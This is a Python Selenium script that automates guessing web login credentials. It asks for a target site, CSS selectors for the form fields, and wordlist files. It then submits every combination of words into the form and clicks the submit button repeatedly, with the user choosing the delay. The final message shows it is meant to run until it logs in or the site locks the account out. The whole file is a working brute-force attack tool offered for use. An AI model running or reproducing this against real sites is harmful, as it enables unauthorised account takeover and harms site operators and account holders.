
from selenium import webdriver
import time
from itertools import product

global cdloc, driver, current_creds


while True:
    try:
        cdloc = input("Enter Chrome Driver Location: ")
        tdriver = webdriver.Chrome(executable_path=cdloc)
        tdriver.close()
        print("Chrome Driver OK! ")
        break
    except:
        print("Error with Chrome Driver! ")
        continue

def custom_fields():

        name = input("Enter name for custom field: ")
        selector = input("Enter HTML Selector: ")
        iteration = input("Is this going to be an iteration? y/n: ")
        print()
        if iteration == "y":
            iteration = 1
        else:
            iteration = 0

        return name, selector, iteration


def read_words():
    eachwords = []
    wloc = input("Enter directory of wordlist: ")
    wl = open(wloc, "r").readlines()
    for i in wl:
        eachwords.append(i.strip())

    return eachwords



while True:
    try:

        site = input("Enter Website to go to: ")
        driver = webdriver.Chrome(executable_path=cdloc)
        driver.get(site)
        page_title = driver.title
        # print("DEBUG: Page Title is ---> ", page_title)
        print()
        print("Website is present and opened! ")
        print()
        break
    except Exception as e:
        print("There is an error with the website format or it's existence! " )
        print()
        continue

cfields = {}

set = {}
nocf = int(input("Enter number of custom fields you want to attack for this page only: "))
print()
if nocf < 1:
    print("Doing nothing for this page. ")
else:
    for i in range(nocf):
        print("Setting parameters for custom field -> ", i + 1)
        print()
        cfname, cfsel, cfiter = custom_fields()
        cfields[cfname] = [cfsel], cfiter

    for j in cfields.keys():
        if cfields[j][1] == int(1):
            print("Setting word list for custom field ->", j)
            print()
            set[j] = read_words(), cfields[j][0], j
            print()
            print("Dynamic iterable set!")
        else:
            print("Setting word list for custom field ->", j)
            print()
            word = input("Insert Single Word for static value: ")
            set[j] = [word], cfields[j][0], j
            print("Dynamic non iterable set!")
            print()

    clicksel = input("Enter Click/submit/go button Selector: ")
    wait_time = int(input("Enter minimum waiting time for each iteration: "))

    count = -1
    wordlist = []
    selector = []
    fields = []

    for i in set.keys():
        count += 1
        wordlist.insert(count, set[i][0])
        selector.insert(count, set[i][1])
        fields.insert(count, set[i][2])

    while True:
        try:
            for i in product(*wordlist):
                cnt = len(i)
                for j in range(cnt):
                    driver.find_element_by_css_selector(selector[j][0]).send_keys(i[j])
                    # print(selector[j][0], i[j])
                    print("Trying", fields[j], "with: -----> ", i[j])
                    time.sleep(0.2)
                driver.find_element_by_css_selector(clicksel).click()
                print("__________________________________________________________")
                time.sleep(int(round(wait_time)))
        except:

            print("You have probably logged in | OR disconnected | Or locked out !!!")
            break








